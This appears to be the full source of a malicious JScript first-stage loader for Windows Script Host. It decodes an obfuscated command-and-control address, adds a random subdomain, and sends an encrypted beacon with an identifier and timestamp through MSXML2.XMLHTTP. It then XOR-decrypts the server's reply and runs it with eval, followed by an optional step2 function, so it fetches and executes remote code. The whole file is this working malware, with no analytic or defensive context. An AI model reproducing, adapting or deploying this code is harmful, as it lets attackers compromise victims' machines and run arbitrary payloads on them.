/* eslint-disable */

var fileUrl = getUrl('9fzi&g8.ikjnea.lmb4/js2u8.fytlkpqp:u.s8h.c#ektunxe:ejr/gl.#n2i/mtd:a&y:mip3hyp#');
var tid = getUrl('882025q');
var content1 = '';
var authHeader = 'Age';
var authKey = getRandHexStr(16);
fileUrl = 'http://' + getRandHexStr(8) + '.' + fileUrl;

function getRandHexStr(length) {
    var text = "";
    var possible = "abcdef0123456789";
    for (var i = 0; i < length; i++) text += possible.charAt(Math.floor(Math.random() * possible.length));
    return text;
}

function a2hex(str) {
    var arr = [];
    for (var i = 0, l = str.length; i < l; i++) {
        var hex = "00" + (Number(str.charCodeAt(i)).toString(16));
        hex = hex.substr(hex.length - 2);
        arr.push(hex);
    }
    return arr.join('');
}

function getUrl(url) {
    var res = '';
    url = url.split('');
    for (var i = 0; i < url.length; i++) {
        if (i % 2 === 1) {
            res += url[i];
        }
    }
    res = res.split("").reverse().join("");
    return res;
}

function decodeContent1(str) {
    var offset = 2;
    var content1_length = parseInt(str.substr(offset + 0, 6), 16);
    var content1_body = str.substr(offset + 6, content1_length * 2);
    content1 = decPayload(content1_body);
}

function decPayload(str) {
    var body;
    var key;
    var i;
    var enc_str = [];
    for (i = 0; i < str.length; i += 2) {
        enc_str.push(parseInt(str.substr(i, 2), 16));
    };
    body = enc_str.slice(enc_str[0] + 1);
    key = enc_str.slice(1, enc_str[0] + 1);
    for (i = 0; i < body.length; i++) {
        body[i] = body[i] ^ key[i % key.length];
    }
    for (i = 0; i < body.length; i++) {
        body[i] = String.fromCharCode(body[i]);
    };
    return body.join('');
}

function encStr(str) {
    var key = getRandomInt(0, 255);
    var i;
    str = str.split('');
    for (i = 0; i < str.length; i++) {
        str[i] = str[i].charCodeAt(0) ^ key;
    };
    for (i = 0; i < str.length; i++) {
        str[i] = String.fromCharCode(str[i]);
    };
    var extra_char = getRandomInt(0, 255);
    return a2hex(String.fromCharCode(extra_char) + String.fromCharCode(key) + str.join(''));
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function initialRequest1() {
    var req = [];
    req.push(getRandHexStr(8));
    req.push(tid);
    req.push(+(new Date()));
    var q = "";
    try {
        for (var i = 0; i < req.length; i++) {
            q += i + "=" + encodeURIComponent('' + req[i]) + "&";
        }
        q = encStr(q);
    } catch (error) {}
    var xmlHttp;
    var attempts = 2;
    var timeout = 3 * 1000;
    for (var i = 0; i < attempts; i++) {
        try {
            xmlHttp = new ActiveXObject("MSXML2.XMLHTTP");
            xmlHttp.open("POST", fileUrl, false);
            xmlHttp.setRequestHeader(authHeader, authKey);
            xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xmlHttp.send('a=' + q);
            if (xmlHttp.status == 200) {
                return xmlHttp.responseText;
            } else {}
            WScript.Sleep(timeout);
        } catch (error) {}
    }
    return false;
}

var data1 = initialRequest1();
if (data1 !== false && data1 != '0' && data1 != '') {
    decodeContent1(data1);
    eval(content1);
    if (typeof step2 == 'function') {
        step2();
    }
}